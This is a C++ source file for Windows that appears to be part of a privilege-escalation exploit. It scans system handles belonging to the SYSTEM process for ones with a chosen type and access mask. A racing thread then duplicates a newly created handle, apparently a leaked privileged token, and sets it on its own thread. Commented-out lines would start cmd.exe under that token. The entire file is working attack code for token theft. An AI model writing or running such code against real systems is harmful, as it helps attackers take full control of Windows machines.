#include "LMI-Common.h"

std::vector<HANDLE> QuerySystemHandlesForObjectTypeAndAccess(DWORD dwObjectType, DWORD dwAccessMask)
{
	std::vector<HANDLE> vectHandles = std::vector<HANDLE>();
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20000);
	if (!lpBuf) {
		printf("HeapAlloc - %d\n", GetLastError());
		return std::vector<HANDLE>();
	}
	ULONG ulBytesReturned = 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, lpBuf, 0x20000, &ulBytesReturned);

	while (status == 0xC0000004) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulBytesReturned + 0x1000);
		if (!lpBuf) {
			printf("HeapAlloc - %d\n", GetLastError());
			return std::vector<HANDLE>();
		}
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, lpBuf, ulBytesReturned + 0x1000, &ulBytesReturned);
	}


	if (status) {
		printf("Query for handles failed - %lx\n", status);
		return std::vector<HANDLE>();
	}

	PSYSTEM_HANDLE_INFORMATION pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)lpBuf;

	for (unsigned int i = 0; i < pSysHandleInfo->NumberOfHandles; i++) {
		SYSTEM_HANDLE_TABLE_ENTRY_INFO shtei = pSysHandleInfo->Handles[i];
		if (shtei.UniqueProcessId != 4) {
			continue;
		}

		printf("%x - %x - %x\n", shtei.HandleValue, shtei.ObjectTypeIndex, shtei.GrantedAccess);
		if (shtei.ObjectTypeIndex == dwObjectType && shtei.GrantedAccess == dwAccessMask) {
			printf("Found handle to process:\t%x - %x - %x\n", shtei.HandleValue, shtei.ObjectTypeIndex, shtei.GrantedAccess);
			vectHandles.push_back((HANDLE)shtei.HandleValue);
		}
	}

	return vectHandles;
}


HANDLE FindNextCreatedHandle() {
	HANDLE highestHandle = 0;
	UINT32 u32NumHandles = 0;
	ULONG ulSizeReturned = 0;
	NTSTATUS status = 0;
	status = NtQueryInformationProcess((HANDLE)-1, (PROCESSINFOCLASS)ProcessHandleCount, &u32NumHandles, sizeof(UINT32), &ulSizeReturned);
	if (!NT_SUCCESS(status)) {
		return (HANDLE)-1;
	}

	return (HANDLE)((UINT64)++u32NumHandles * 4);
}

VOID HandleSearchThread(LPVOID lpParam) {
	HANDLE hToken = INVALID_HANDLE_VALUE;
	NTSTATUS status = 0;
	BOOL bRes = FALSE;
	BOOL b1 = FALSE;
	// get the next highest handle value
	HANDLE hTarget = FindNextCreatedHandle();
	HANDLE hCurrentThread = GetCurrentThread();
	hTarget = (HANDLE)((UINT64)hTarget + 4);
	
	if (!g_NtDuplicateObject) {
		HMODULE hNtdll = GetModuleHandleA("ntdll");
		if (!hNtdll) {
			return;
		}
		g_NtDuplicateObject = (lpNtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
		if (!g_NtDuplicateObject) {
			return;
		}
	}

	while (!b1) {	

		// try to duplicate
		b1 = DuplicateHandle(g_hCurrentProc, hTarget, g_hCurrentProc, &hToken, NULL, FALSE, DUPLICATE_SAME_ACCESS);
		//status = g_NtDuplicateObject(g_hCurrentProc, (HANDLE)((UINT64)hTarget + 4), g_hCurrentProc, &hToken, NULL, FALSE, DUPLICATE_SAME_ACCESS);
		//printf("%llx:%llx:%x\n", hTarget, (HANDLE)((UINT64)hTarget + 4), status);
		//printf("%llx:%x:%x\n", hTarget, b1, GetLastError());
		//b2 = DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup);
		//b1 = OpenProcessToken((HANDLE)((UINT64)hTarget + 4), TOKEN_ALL_ACCESS, &hToken);		
	}
	if (b1) {
		puts("ebin");
		printf("%llx - target\n", hTarget);
		printf("%llx - dup\n", hToken);
		getchar();
		/*STARTUPINFO startupInfo;
		PROCESS_INFORMATION processInformation;
		ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
		ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
		bRes = CreateProcessWithTokenW(hToken, NULL, NULL, (LPWSTR)LR"(C:\\Windows\\System32\\cmd.exe)", 0, NULL, NULL, &startupInfo, &processInformation);*/
		bRes = SetThreadToken(NULL, hToken);
		if (!bRes) {
			printf("Failed to SetThreadToken - %x\n", GetLastError());
		}
	}
}